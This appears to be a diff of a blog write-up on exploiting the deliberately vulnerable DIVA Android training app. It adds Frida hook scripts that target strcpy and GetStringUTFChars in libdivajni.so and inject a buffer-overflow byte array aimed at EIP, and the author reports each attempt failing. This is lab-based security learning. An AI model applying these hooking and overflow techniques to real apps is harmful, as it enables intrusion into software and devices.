@@ -296,8 +296,7 @@ tuvwxyz{|}~
 <br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
-<br>0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
-<br>0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
+0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
@@ -325,7 +324,7 @@ tuvwxyz{|}~
 <br>&nbsp;&nbsp;&nbsp;&nbsp;var SpannableStringBuilder = Java.use("android.text.SpannableStringBuilder");
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SpannableStringBuilder.toString.overload().implementation = function () {
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var retval = this.toString.call(this);
-<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("[*] SpannableStringBuilder Return: " + retval);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("[\*] SpannableStringBuilder Return: " + retval);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return '\xe7\x9f\x3e\x66';
 <br>&nbsp;&nbsp;&nbsp;&nbsp;};
 <br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(string_with_jni_addr, {
@@ -350,17 +349,47 @@ tuvwxyz{|}~
 <br>We tried to force to return value "u03f7" and it returns cf,b7 like this conversion table which we noticed earlier also, but this time with some proper evidence:
 <br>![14-58](https://teckk2.github.io/assets/images/DIVA/14-58.png)
 <br>The idea now was to find the exact values that once encoded give us just the bytes of the address we need to write in EIP, unfortunately not all the bytes have a corresponding in UTF8 and so it was another failure.
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
+<br>Now we will try to hook **strcpy**
+<br>Digging deeper again, with gdb, we found that inside DivaJni_initiateLaunchSequence another function was called: strcpy
+<br>As always we created a Js script to hook this native function and replace return value with our buffer overflow trigger bytes array.
+<br>![14-59](https://teckk2.github.io/assets/images/DIVA/14-59.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Java.perform(function () {                                                                                                                                                       &nbsp;&nbsp;try {
+&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
+&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
+&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var stringcopy = Module.findExportByName("libdivajni.so",
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"strcpy")
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpyPtr pointer is: " + stringcopy)
+&nbsp;&nbsp;&nbsp;&nbsp;};
+&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(stringcopy, {
+&nbsp;&nbsp;&nbsp;&nbsp;onEnter: function(args){
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src:" + Memory.readUtf8String (args [1]));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy dest:" + args[0]);
+&nbsp;&nbsp;&nbsp;&nbsp;},
+&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function (retval) {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy, retval="+retval);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src=" + Memory.readCString(retval));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;})
+&nbsp;&nbsp;}
+&nbsp;&nbsp;catch(e) {
+&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+&nbsp;&nbsp;}
+});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Not even this attempt has led us to our desired result.
+<br>Let’s try now hooking GetStringUTFChars
+<br>Digging deeper again, with gdb, we found another function was called: GetStringUTFChars.
+<br>This time we found our bad guy and the following Frida error message can confirm that fact:
+<p class="message">
+  Abort message: 'art/runtime/java_vm_ext.cc:470] JNI DETECTED ERROR IN APPLICATION: GetStringUTFChars received NULL jstring'
+</p>
+<br>At this point we read about Java.vm.getEnv() and wrote this script that calculate the offset of our function from the functions pointer table. 
 <br>
 <br>
 <br>
